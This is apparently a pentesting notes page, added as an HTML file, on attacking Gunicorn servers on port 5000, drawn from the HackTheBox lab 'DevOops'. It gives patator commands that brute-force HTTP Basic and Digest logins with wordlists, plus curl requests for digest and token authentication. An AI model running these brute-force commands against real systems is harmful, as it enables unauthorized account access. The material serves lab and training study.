@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>5000 - Gunicorn</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Port 5000 - Gunicorn</h1></strong><br />According to their website, Gunicorn is a “Python Web Server Gateway Interface HTTP Server&quot;.<br />According it Google, Gunicorn is primarily used to serve Python web applications.<br /><br />Browse to the site / python web app at <code>http://10.10.10.91:5000</code><br /><br /><strong>Examples</strong><br />• hackthebox DevOops<br /><br /><strong><h2>## Bruteforce HTTP Authentication</h2></strong><br /><strong><h3>### Basic</h3></strong><br />Bruteforce just like normal.<br /><code>patator http_fuzz url=http://$ip user_pass=FILE0:FILE1 0=/usr/share/metasploit-framework/data/wordlists/unix_users.txt 1=wordlists/100-common-passwords.txt -x ignore:code=401</code><br /><br /><strong><h3>### Digest</h3></strong><br />Gunicorn digest authentcation won&#39;t work unless you send it a cookie.<br />With patator, can do <code>accept_cookie=1</code> to repeat a cookie it receives.<br /><br /><code>patator http_fuzz url=http://$ip user_pass=FILE0:FILE1 auth_type=digest 0=/usr/share/metasploit-framework/data/wordlists/unix_users.txt 1=wordlists/100-common-passwords.txt -x ignore:code=401 accept_cookie=1</code><br /><br />Can then access web page by providing any random cookie value<br /><code>curl --user admin:cookie1 --digest --cookie blah </code><a href="http://$ip">http://$ip</a><br /><br /><strong><h3>### Token Authentication</h3></strong><br /><code>curl -H &quot;Authorization: Token 123123123&quot; http://$ip</code></div>
+</body>
+</html>
